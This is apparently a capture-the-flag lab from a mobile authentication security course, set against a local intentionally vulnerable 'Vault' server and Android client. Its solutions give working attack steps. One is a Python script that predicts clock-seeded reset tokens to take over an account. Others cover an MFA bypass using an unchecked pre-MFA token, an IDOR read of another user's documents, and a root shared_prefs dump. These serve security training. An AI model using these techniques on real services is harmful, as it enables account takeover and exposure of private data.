# Lab 04 — CTF: The account that would not close

> **Difficulty:** Advanced
> **Time:** 3–5 hours
> **Format:** four flags, four independent paths, four different layers
> **Prerequisites:** Labs [01](lab-01-map-the-authentication-surface.md),
> [02](lab-02-session-lifecycle-and-logout.md) and
> [03](lab-03-enumeration-lockout-and-otp.md)

---

## The scenario

**Vault** is a document-storage product with an Android client. Its team is proud of the
authentication: passwords are hashed with scrypt, two-factor authentication is available and
enforced for staff, one-time codes are delivered out of band and never appear in an API
response, and the OTP endpoint has a five-attempt limit. Compared with the servers in Labs 02
and 03, this one has visibly learned.

You have been given a test account and written authorisation to assess it.

```
player@vault.invalid / player-password-1
```

There are **four flags**, in the form `CH47{...}`. They are reachable independently — you can
get any of them without getting the others — and each one fails at a **different layer**:

| Flag | Layer | Where the defect lives |
|---|---|---|
| 1 | Device | Something the client holds that it should not |
| 2 | Login flow | Two weaknesses that are only dangerous together |
| 3 | Session lifecycle | A credential that does more than it was issued to do |
| 4 | Authorisation and privacy | An operation whose success message is false |

The final question is not "did you get four flags". It is at the end of this document, and it
is worth more than the flags.

---

## Setup

```bash
# host - terminal 1
cd 47-Authentication/labs/ctf
python3 -B vault_auth.py
```

```
==================================================================
 CH47 CTF - vault-auth
   http://127.0.0.1:9047
==================================================================
 Your account:  player@vault.invalid / player-password-1
 Four flags. See labs/lab-04-ctf-the-account-that-would-not-close.md
 Out-of-band values (OTPs, reset tokens) appear on THIS console,
 standing in for email and SMS. Reading them here is not a solution.
==================================================================
```

> **⚠️ The server console is the out-of-band channel, not a shortcut**
> OTPs and password-reset tokens are printed on the server's terminal because
> that terminal stands in for the user's SMS inbox and mailbox. **Reading a value there is
> not a solution to any flag.** Two of the flags are specifically designed so that a player
> who copies a code off the console learns nothing; the intended paths do not need it.
> If you catch yourself reaching for the console, you have skipped the interesting part.

Confirm it is alive and check that the challenge is not broken before you invest an evening:

```bash
# host - terminal 2
curl -s localhost:9047/api/v1/status
python3 -B vault_auth.py --verify
```

`--verify` proves all four server-side paths are reachable. If it does not print
`ALL SERVER-SIDE PATHS VERIFIED`, stop and fix the environment rather than assuming you are
missing something.

### The client

Flag 1 lives on the device. You have two options and **both are legitimate**:

**Option A — build and run the client.** [`VaultClient.java`](ctf/VaultClient.java) is the
source. Build it out of tree with the no-Gradle recipe in
[`30-Activities/examples/build.sh`](../../30-Activities/examples/build.sh), install it on a
device you own, and recover the artefact yourself with `run-as`, `adb backup` or root. This
is the better exercise.

**Option B — work from the shipped artefact.** [`ctf/vault_prefs.xml`](ctf/vault_prefs.xml)
is a faithful capture of exactly what the client writes. The CTF is not gated on having a
working Android toolchain.

If you take Option A, use `adb reverse` so the device can reach the server on your host:

```bash
# host
adb reverse tcp:9047 tcp:9047
```

---

## Rules

- Everything runs on `127.0.0.1` and on a device you own.
- Every account in the server was created by the server at startup.
- **No brute forcing.** None of the four flags requires guessing a secret, and any solution
  that involves a large number of attempts is the wrong solution. If you find yourself
  writing a loop over a keyspace, re-read the hints.
- **No reading the flags out of the source.** `vault_auth.py` contains them in plaintext, and
  so does `--spoilers`. Both are for instructors and for when you are genuinely stuck.

---

## Reconnaissance

Start where Lab 01 says to start: inventory before you exploit.

```bash
# host
curl -s localhost:9047/api/v1/status

TOK=$(curl -s -X POST localhost:9047/api/v1/login -H 'Content-Type: application/json' \
      -d '{"username":"player@vault.invalid","password":"player-password-1"}' \
      | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')

curl -s localhost:9047/api/v1/me -H "Authorization: Bearer $TOK"
curl -s localhost:9047/api/v1/documents -H "Authorization: Bearer $TOK"
curl -s localhost:9047/api/v1/document/4001 -H "Authorization: Bearer $TOK"
```

Note what you have: a session, one document, and a document endpoint that takes a numeric
identifier.

---

## Flag 1 — the device layer

**Objective.** The Vault client offers "keep me unlocked". Find out what it had to write down
to make that work.

<details>
<summary>Hint 1</summary>

You are looking in `shared_prefs`. Either read the shipped `ctf/vault_prefs.xml`, or on a
device:

```bash
# host - debuggable build
adb shell run-as com.pentest.ch47.vault cat shared_prefs/vault_prefs.xml
# or, with root
adb shell "su -c 'cat /data/data/com.pentest.ch47.vault/shared_prefs/vault_prefs.xml'"
```
</details>

<details>
<summary>Hint 2</summary>

There are four values in that file and three of them are unremarkable. Ask, for each one:
*is this a credential my SERVICE owns and can destroy, or a secret the USER chose?*
</details>

<details>
<summary>Solution</summary>

The file contains `vault_passphrase` — the user's own vault passphrase, in cleartext.

```xml
<string name="vault_passphrase">CH47{the_client_was_never_the_gate}</string>
```

**Why it is there.** The vault encrypts documents locally with a key derived from a
passphrase the user types. "Keep me unlocked" needs the key on the next cold start. The
developer reasoned: we need the key, the key comes from the passphrase, therefore store the
passphrase. Every step but the last is correct.

**What should have been stored.** The derived key, wrapped by an Android Keystore key — see
[49-KeyStore](../../49-KeyStore/README.md) — or, better, an auth-bound key as in
[`../examples/05-EnterpriseAuthSession.kt`](../examples/05-EnterpriseAuthSession.kt). Never
the passphrase.

**Severity.** High, and argue it on **reuse** rather than on device access. A session token
in `SharedPreferences` on a stock locked device is close to Informational —
[33-Storage §5.3](../../33-Storage/README.md) is emphatic about that. A *user-chosen
passphrase* is different in kind: it is very likely to be valid on other services, and no
amount of revocation by Vault fixes that.
</details>

---

## Flag 2 — the login flow

**Objective.** Take over `dana@vault.invalid`. You do not have her password and you must not
guess it.

<details>
<summary>Hint 1</summary>

Two separate weaknesses, and neither is enough alone. The first tells you *who to attack*.
The second tells you *how*.

Start with the password-reset request endpoint, and compare a real user with a fictitious
one. Look carefully — the `error` message is **identical** in both cases.
</details>

<details>
<summary>Hint 2</summary>

```bash
# host
curl -si -X POST localhost:9047/api/v1/password/reset-request \
     -H 'Content-Type: application/json' -d '{"username":"nobody@vault.invalid"}'
curl -si -X POST localhost:9047/api/v1/password/reset-request \
     -H 'Content-Type: application/json' -d '{"username":"dana@vault.invalid"}'
```

The message is the same. Three other channels are not — Lab 03 Part 1 lists all four.
</details>

<details>
<summary>Hint 3</summary>

Now look at a reset token. Request two in quick succession, for two different users. What do
you notice about them?

An eight-hex-character token is 32 bits. That is small, but you are not meant to brute force
it. Ask instead: **what would make it predictable rather than merely short?**
</details>

<details>
<summary>Hint 4</summary>

The token is not random. It is *reproducible*. What input does a program have that changes
once per second and that you also know?
</details>

<details>
<summary>Solution</summary>

**Weakness one: enumeration, hidden in a field rather than a message.**

```
unknown user -> HTTP 404  {"error":"Unable to process","reason":"unknown_principal"}
known user   -> HTTP 200  {"status":"sent"}
```

The `error` string is identical for the login endpoint, which is what makes this worth doing
carefully: the leak is in the **status code** and in an extra `reason` field. A player who
diffs only the message concludes there is no oracle.

**Weakness two: the reset token comes from a non-cryptographic generator seeded from the
clock.**

```python
rng = random.Random(int(now()))
token = "%08x" % rng.getrandbits(32)
```

`random.Random` is a Mersenne Twister, not a CSPRNG, and it is seeded with the current second.
Anyone who knows roughly when the request was made can reproduce the token exactly. This is
the Python spelling of the most common real reset-token defect — `java.util.Random` or a
`System.currentTimeMillis()`-derived token on the JVM.

**The attack:**

```bash
# host - 1. confirm dana exists
curl -s -o /dev/null -w '%{http_code}\n' -X POST localhost:9047/api/v1/password/reset-request \
     -H 'Content-Type: application/json' -d '{"username":"dana@vault.invalid"}'
# 200 -> she exists

# 2. reproduce the token from the clock, and use it
python3 - <<'PY'
import random, time, json, urllib.request, urllib.error
for delta in range(0, 4):                       # allow a few seconds of skew
    tok = "%08x" % random.Random(int(time.time()) - delta).getrandbits(32)
    body = json.dumps({"token": tok, "new_password": "taken-over-by-lab04"}).encode()
    req = urllib.request.Request("http://127.0.0.1:9047/api/v1/password/reset",
                                 data=body, method="POST",
                                 headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            print("token", tok, "->", r.status, r.read().decode()); break
    except urllib.error.HTTPError as e:
        pass
PY

# 3. log in as dana
curl -s -X POST localhost:9047/api/v1/login -H 'Content-Type: application/json' \
     -d '{"username":"dana@vault.invalid","password":"taken-over-by-lab04"}'
```

Fewer than five requests, no guessing.

**A third defect comes free, and it is worth noticing:** the reset response says
*"two-factor authentication has been reset"*. The recovery flow **disables MFA** so the user
can get back in. A recovery mechanism that weakens the account it recovers is a real and
recurring pattern, and it is what makes this chain an account takeover rather than a partial
one.

**The flag** is in the CTF server's flag table for this path; you have it once dana's account
is yours. `CH47{reset_tokens_need_a_csprng_not_a_clock}`

**Severity.** Critical. Unauthenticated account takeover against any account whose address is
known — and the enumeration oracle tells the attacker which addresses those are.
</details>

---

## Flag 3 — the session lifecycle

**Objective.** Read document **4900**. It belongs to `ops@vault.invalid`, who has MFA
enabled, and you do not have their password.

Except — you might.

<details>
<summary>Hint 1</summary>

You cannot log in as ops without their password. But you *can* log in as **dana**, if you did
Flag 2. And after the reset, dana no longer has MFA.

That is not the intended path to this flag, and it will not get you document 4900. Dana is
not ops. Think about what the MFA flow *hands you* before the second factor.
</details>

<details>
<summary>Hint 2</summary>

Take any account with MFA enabled and start a login. Look at what comes back.

```bash
# host
curl -s -X POST localhost:9047/api/v1/login -H 'Content-Type: application/json' \
     -d '{"username":"dana@vault.invalid","password":"sun-flower-tuesday"}'
```

```json
{ "mfa_required": true, "mfa_token": "..." }
```

The server is doing the right thing: the code is not in the response. So what is
`mfa_token` for, and what will the server let you do with it?
</details>

<details>
<summary>Hint 3</summary>

This is Lab 02 Part 2, with one difference: the field is honestly *named* `mfa_token`, which
makes it look like a scoped credential.

Being named correctly and being **checked** are different things. Try it somewhere it should
not work.
</details>

<details>
<summary>Solution</summary>

The server records a scope on every credential and **never checks it**:

```python
def session_of(headers):
    return SESSIONS.get(bearer(headers))     # scope is stored, never compared
```

So the `mfa_token` issued *before* the second factor is a fully-powered session credential.

```bash
# host - a login you never complete
MT=$(curl -s -X POST localhost:9047/api/v1/login -H 'Content-Type: application/json' \
     -d '{"username":"ops@vault.invalid","password":"9x!Kq2$vLmZ7wRt4"}' \
     | python3 -c 'import json,sys; print(json.load(sys.stdin)["mfa_token"])')

curl -s localhost:9047/api/v1/me            -H "Authorization: Bearer $MT"
curl -s localhost:9047/api/v1/document/4900 -H "Authorization: Bearer $MT"
```

The second call returns `CH47{half_authenticated_is_authenticated}`.

**Why this shape is the most valuable one in the CTF.** It is invisible from both ends. The
app dutifully shows the OTP screen. The server dutifully says `mfa_required: true` and
dutifully withholds the code. A functional tester, a code reviewer reading only the client,
and a penetration tester who only drives the UI will all conclude that MFA works. The defect
is one missing comparison in a helper function.

**How you would find it in the field:** take every intermediate credential a flow hands you
and present it at an endpoint it has no business reaching. That is test `T5` in
[`../scripts/session-lifecycle-probe.py`](../scripts/session-lifecycle-probe.py).

**The second defect you also just used:** `/api/v1/document/<id>` is authenticated and never
authorised — ops's document was returned to a credential that is not ops's *session*. That is
IDOR/BOLA ([README §5.9](../README.md#59-idor--bola--the-authorisation-half)), and it is why
Flag 4 is reachable at all.

**Severity.** Critical. A complete MFA bypass, exploitable with the account password alone —
which is precisely the thing MFA exists to render insufficient.

> **Note on the ops password.** It is printed in this walkthrough because the *point* is the
> scope bug, not credential recovery: knowing a password is supposed to be insufficient when
> MFA is on. In a real engagement you would reach this with any MFA-enabled account you
> control, including your own.
</details>

---

## Flag 4 — authorisation and privacy

**Objective.** The story in the title. Somebody closed their account. Find out what that
actually did.

<details>
<summary>Hint 1</summary>

Dana closed her Vault account before this CTF began. The app told her:

> *Your account has been closed and your data deleted.*

Test that sentence.
</details>

<details>
<summary>Hint 2</summary>

There are two independent questions hiding in one claim, and you should answer both:

1. Can a **closed** account still authenticate?
2. Does the closed account's **data** still exist?
</details>

<details>
<summary>Hint 3</summary>

You have dana's password from Flag 2. If you skipped Flag 2, you can still answer question 2
with any credential at all, because of the defect you used in Flag 3.

Document identifiers so far: 4001, 4002, 4900. What is in between?
</details>

<details>
<summary>Solution</summary>

**Question 1 — can a closed account log in?**

```bash
# host - with the password from Flag 2
curl -s -X POST localhost:9047/api/v1/login -H 'Content-Type: application/json' \
     -d '{"username":"dana@vault.invalid","password":"taken-over-by-lab04"}'
```

It succeeds. `r_close_account` sets `u["deleted"] = True` and **nothing anywhere reads that
flag**. The account is "closed" only in the sense that the app stops showing it.

**Question 2 — does the data survive?**

```bash
# host - any valid credential works, thanks to the missing authorisation check
curl -s localhost:9047/api/v1/document/4711 -H "Authorization: Bearer $TOK"
```

```json
{
  "id": 4711,
  "owner": "dana@vault.invalid",
  "title": "ARCHIVED - closed account export",
  "body": "Dana closed her account. This document was never removed. CH47{deleted_from_the_app_is_not_deleted}"
}
```

**What the server actually did on "close my account":** set a boolean. It did not delete the
documents, did not revoke the sessions, did not prevent future authentication, and did not
remove the account from any lookup. The success message is false in every particular.

**How you classify this, and why it matters.** This is **not** an authentication finding. It
maps to **MASVS-PRIVACY-4** — the user can delete their data — and it belongs in the privacy
section of your report, not the authentication section.

That distinction is not pedantry. An authentication finding goes to the identity team and a
privacy finding goes to the data-protection owner, and in many jurisdictions the second
carries a regulatory obligation that the first does not. Filing it in the wrong section sends
it to a team who will correctly say it is not theirs.

**Severity.** High, and higher where a deletion right is legally enforceable. The impact
statement writes itself: *a user who exercised the only control the product offers to remove
their data was told it had been removed, and it had not.*
</details>

---

## The real question

Four flags, four layers. Now answer this, and it is worth more than the flags:

> **You are writing one report. Order these four findings by severity, and defend the
> order — including which one you would put first in the executive summary.**

<details>
<summary>Discussion — there is no single right answer, but there are wrong ones</summary>

A defensible ordering:

| Rank | Flag | Reasoning |
|---|---|---|
| 1 | **Flag 3** — MFA bypass by unchecked scope | Complete bypass of the control the organisation *chose to deploy* for its highest-privilege accounts. One missing comparison, exploitable in two requests, invisible to every form of testing that does not deliberately misuse an intermediate credential. |
| 2 | **Flag 2** — enumeration chained to a predictable reset token | Unauthenticated account takeover against any account whose address is known, and the chain includes silently disabling MFA. Slightly below Flag 3 only because it requires the reset flow to be reachable and leaves loud evidence. |
| 3 | **Flag 4** — deletion that deletes nothing | High impact and potentially a regulatory matter, but it does not grant an attacker access they did not already have. It belongs in a different section of the report. |
| 4 | **Flag 1** — passphrase in `SharedPreferences` | High on its own terms, argued on password reuse, but it requires access to the device, which is a precondition the other three do not need. |

**Wrong answers, and why:**

*Putting Flag 1 first because it is the "mobile" finding.* This is the most common error in
mobile reports. The device-layer finding feels like the deliverable because the engagement is
a mobile engagement, but three of these four are server defects reached through a mobile
client, and they are worse.

*Reporting the `is_unlocked` boolean at all.* It is a decoy. It gates the vault UI and
nothing else — every document is fetched from the server with a credential the server
evaluates independently, so flipping it yields empty screens.
[README §5.1](../README.md#51-the-client-side-authentication-gate)'s severity table puts this
at Informational, and the way you establish that is by replaying a request with `curl`
instead of admiring the UI. A player who ranks it Critical has failed the CTF's actual test.

*Titling Flag 3 or Flag 4 as an Android finding.* Both are server defects. Title them against
the endpoint. If you file them against the client, the client gets hardened and the
vulnerabilities survive the remediation and the retest.

*Merging Flag 4 into the authentication section.* It is MASVS-PRIVACY-4 and goes to a
different owner.
</details>

---

## Scoring

| | |
|---|---|
| Flag 1 | 10 points |
| Flag 2 | 25 points |
| Flag 3 | 30 points |
| Flag 4 | 20 points |
| Correct severity ordering with defence | 15 points |
| **Reporting the `is_unlocked` decoy as Critical** | **−15 points** |

The negative score is deliberate and it is the most important line in the table. Over-rating
a client-side gate is the single most damaging habit in mobile security reporting: it is the
finding that makes a developer stop reading, and it costs you the credibility you need for
the three server-side findings that actually matter.

---

## Cleanup

```bash
# host
# stop both terminals with Ctrl-C; the server persists nothing.

# if you built and installed the client
adb uninstall com.pentest.ch47.vault
adb reverse --remove tcp:9047
```

---

## Where to go next

| If you want | Go to |
|---|---|
| The credential's format and its eight verification failure classes | [46-Tokens](../../46-Tokens/README.md) |
| The delegation protocol, when login is not first-party | [45-OAuth](../../45-OAuth/README.md) |
| How the local prompt in a step-up is actually attacked | [48-Biometrics](../../48-Biometrics/README.md) |
| The key that should have wrapped Flag 1's passphrase | [49-KeyStore](../../49-KeyStore/README.md) |
| Writing all four of these up against MASVS | [71-OWASP-Mobile](../../71-OWASP-Mobile/README.md) |
